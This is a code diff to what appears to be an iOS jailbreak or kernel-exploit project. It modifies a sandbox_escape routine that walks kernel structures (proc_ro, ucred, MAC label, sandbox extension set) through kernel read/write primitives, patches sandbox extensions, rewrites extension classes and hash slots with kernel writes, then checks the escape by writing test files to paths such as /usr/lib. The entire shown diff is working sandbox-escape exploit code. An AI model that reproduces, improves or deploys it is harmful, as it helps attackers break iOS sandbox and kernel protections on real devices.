@@ -33,8 +33,11 @@
 #include "kexploit/kexploit_opa334.h"
 #include "kexploit/krw.h"
 #include "kexploit/offsets.h"
+#include "kexploit/sandbox.h"
+#include "utils/tweak_log.h"
 
 extern void early_kread(uint64_t where, void *read_buf, size_t size);
+extern int check_sandbox_var_rw(void);
 
 #define KRW_LEN 0x20
 
@@ -46,6 +49,15 @@ extern void early_kread(uint64_t where, void *read_buf, size_t size);
 #define OFF_SANDBOX_EXT_SET    0x10  // sandbox → ext_set
 #define OFF_EXT_DATA           0x40  // ext → data_addr
 #define OFF_EXT_DATALEN        0x48  // ext → data_len
+
+// Kernel address range — used to validate pointers before dereference.
+// These are loaded at runtime from offsets_init().
+extern uint64_t VM_MIN_KERNEL_ADDRESS;
+extern uint64_t VM_MAX_KERNEL_ADDRESS;
+
+static inline bool ptr_in_kernel(uint64_t p) {
+    return (p >= VM_MIN_KERNEL_ADDRESS && p <= VM_MAX_KERNEL_ADDRESS && (p & 0x7) == 0);
+}
 
 #ifdef __arm64e__
 static uint64_t __attribute((naked)) __xpaci_sbx(uint64_t a) {
@@ -112,60 +124,60 @@ static void set_rw_class(uint64_t hdr) {
 #pragma mark - Main entry
 
 int sandbox_escape(uint64_t self_proc) {
-    if (!self_proc) { NSLog(@"[SBX] self_proc is NULL"); return -1; }
+    if (!self_proc) { TweakLog("[SBX] self_proc is NULL"); return -1; }
 
     uint64_t proc_ro_raw = early_kread64(self_proc + OFF_PROC_PROC_RO);
     uint64_t proc_ro = S(proc_ro_raw);
-    NSLog(@"[SBX] self_proc=0x%llx proc_ro_raw=0x%llx proc_ro=0x%llx", self_proc, proc_ro_raw, proc_ro);
-    if (!K(proc_ro)) { NSLog(@"[SBX] proc_ro invalid"); return -1; }
+    TweakLog("[SBX] self_proc=0x%llx proc_ro_raw=0x%llx proc_ro=0x%llx", self_proc, proc_ro_raw, proc_ro);
+    if (!K(proc_ro)) { TweakLog("[SBX] proc_ro invalid"); return -1; }
 
     // Scan proc_ro for ucred — offset varies by iOS build.
     // p_ucred is an SMR pointer. Dump offsets 0x10-0x40 to find it.
-    NSLog(@"[SBX] Scanning proc_ro for ucred...");
+    TweakLog("[SBX] Scanning proc_ro for ucred...");
     uint64_t ucred = 0;
     for (uint32_t off = 0x10; off <= 0x40; off += 0x8) {
         uint64_t raw = early_kread64(proc_ro + off);
         uint64_t smr = kread_smrptr(proc_ro + off);
         uint64_t pac = S(raw);
-        NSLog(@"[SBX]   proc_ro+0x%x: raw=0x%llx smr=0x%llx pac=0x%llx", off, raw, smr, pac);
+        TweakLog("[SBX]   proc_ro+0x%x: raw=0x%llx smr=0x%llx pac=0x%llx", off, raw, smr, pac);
 
         // Check if smr-decoded value looks like ucred (cr_label at +0x78 is a kernel ptr)
-        if (K(smr)) {
+        if (ptr_in_kernel(smr)) {
             uint64_t maybe_label = S(early_kread64(smr + 0x78));
-            if (K(maybe_label)) {
+            if (ptr_in_kernel(maybe_label)) {
                 uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
-                if (K(maybe_sandbox)) {
-                    NSLog(@"[SBX] Found ucred at proc_ro+0x%x (SMR) = 0x%llx", off, smr);
+                if (ptr_in_kernel(maybe_sandbox)) {
+                    TweakLog("[SBX] Found ucred at proc_ro+0x%x (SMR) = 0x%llx", off, smr);
                     ucred = smr;
                     break;
                 }
             }
         }
         // Also try PAC-stripped
-        if (!ucred && K(pac)) {
+        if (!ucred && ptr_in_kernel(pac)) {
             uint64_t maybe_label = S(early_kread64(pac + 0x78));
-            if (K(maybe_label)) {
+            if (ptr_in_kernel(maybe_label)) {
                 uint64_t maybe_sandbox = S(early_kread64(maybe_label + 0x10));
-                if (K(maybe_sandbox)) {
-                    NSLog(@"[SBX] Found ucred at proc_ro+0x%x (PAC) = 0x%llx", off, pac);
+                if (ptr_in_kernel(maybe_sandbox)) {
+                    TweakLog("[SBX] Found ucred at proc_ro+0x%x (PAC) = 0x%llx", off, pac);
                     ucred = pac;
                     break;
                 }
             }
         }
     }
-    if (!K(ucred)) { NSLog(@"[SBX] ucred not found in proc_ro"); return -1; }
+    if (!K(ucred)) { TweakLog("[SBX] ucred not found in proc_ro"); return -1; }
 
     uint64_t label = S(early_kread64(ucred + OFF_UCRED_CR_LABEL));
-    if (!K(label)) { NSLog(@"[SBX] cr_label invalid"); return -1; }
+    if (!K(label)) { TweakLog("[SBX] cr_label invalid"); return -1; }
 
     uint64_t sandbox = S(early_kread64(label + OFF_LABEL_SANDBOX));
-    if (!K(sandbox)) { NSLog(@"[SBX] sandbox invalid"); return -1; }
+    if (!K(sandbox)) { TweakLog("[SBX] sandbox invalid"); return -1; }
 
     uint64_t ext_set = S(early_kread64(sandbox + OFF_SANDBOX_EXT_SET));
-    if (!K(ext_set)) { NSLog(@"[SBX] ext_set invalid"); return -1; }
+    if (!K(ext_set)) { TweakLog("[SBX] ext_set invalid"); return -1; }
 
-    NSLog(@"[SBX] proc_ro=0x%llx ucred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx",
+    TweakLog("[SBX] proc_ro=0x%llx ucred=0x%llx label=0x%llx sandbox=0x%llx ext_set=0x%llx",
           proc_ro, ucred, label, sandbox, ext_set);
 
     int patched = 0;
@@ -173,14 +185,14 @@ int sandbox_escape(uint64_t self_proc) {
         uint64_t hdr = S(early_kread64(ext_set + s * 8));
         if (K(hdr)) patched += patch_chain(hdr);
     }
-    NSLog(@"[SBX] Patched %d extensions", patched);
+    TweakLog("[SBX] Patched %d extensions", patched);
 
     int classed = 0;
     for (int s = 0; s < 16; s++) {
         uint64_t hdr = S(early_kread64(ext_set + s * 8));
         if (K(hdr) && K(early_kread64(hdr + 0x10))) { set_rw_class(hdr); classed++; }
     }
-    NSLog(@"[SBX] Changed %d extension classes", classed);
+    TweakLog("[SBX] Changed %d extension classes", classed);
 
     uint64_t src = 0;
     for (int s = 0; s < 16 && !src; s++) {
@@ -188,22 +200,46 @@ int sandbox_escape(uint64_t self_proc) {
         if (K(h)) src = h;
     }
     if (src) {
-        int filled = 0;
-        for (int s = 0; s < 16; s++) {
-            uint64_t h = early_kread64(ext_set + s * 8);
-            if (!h || !K(h)) { early_kwrite64(ext_set + s * 8, src); filled++; }
-        }
-        NSLog(@"[SBX] Filled %d empty hash slots", filled);
+    int filled = 0;
+    for (int s = 0; s < 16; s++) {
+        uint64_t h = early_kread64(ext_set + s * 8);
+        if (!h || !K(h)) { early_kwrite64(ext_set + s * 8, src); filled++; }
+    }
+    TweakLog("[SBX] Filled %d empty hash slots", filled);
     }
 
-    int fd_w = open("/var/mobile/.sbx_test", O_WRONLY | O_CREAT | O_TRUNC, 0644);
-    if (fd_w >= 0) { close(fd_w); unlink("/var/mobile/.sbx_test"); }
+    // Comprehensive verification: test write to multiple paths
+    static const char *testPaths[] = {
+        "/var/mobile/.sbx_test",
+        "/private/var/tmp/.sbx_test",
+        "/usr/lib/.sbx_test",
+        NULL
+    };
 
-    if (fd_w >= 0) {
-        NSLog(@"[SBX] *** SANDBOX ESCAPED (R+W) ***");
+    int successCount = 0;
+    for (int i = 0; testPaths[i]; i++) {
+        int fd_w = open(testPaths[i], O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (fd_w >= 0) {
+            close(fd_w);
+            unlink(testPaths[i]);
+            successCount++;
+        }
+    }
+
+    if (successCount >= 2) {
+        TweakLog("[SBX] *** SANDBOX ESCAPED (R+W) — %d/%d tests passed ***",
+              successCount, (int)(sizeof(testPaths)/sizeof(testPaths[0]) - 1));
         return 0;
     }
 
-    NSLog(@"[SBX] Sandbox escape verification failed (errno=%d: %s)", errno, strerror(errno));
+    // If user-level tests fail, verify via kernel sandbox_check
+    if (check_sandbox_var_rw() == 0) {
+        TweakLog("[SBX] Kernel sandbox_check confirms R+W despite userspace test failure");
+        return 0;
+    }
+
+    TweakLog("[SBX] Sandbox escape verification failed (errno=%d: %s) — %d/%d tests passed",
+          errno, strerror(errno), successCount,
+          (int)(sizeof(testPaths)/sizeof(testPaths[0]) - 1));
     return -1;
 }
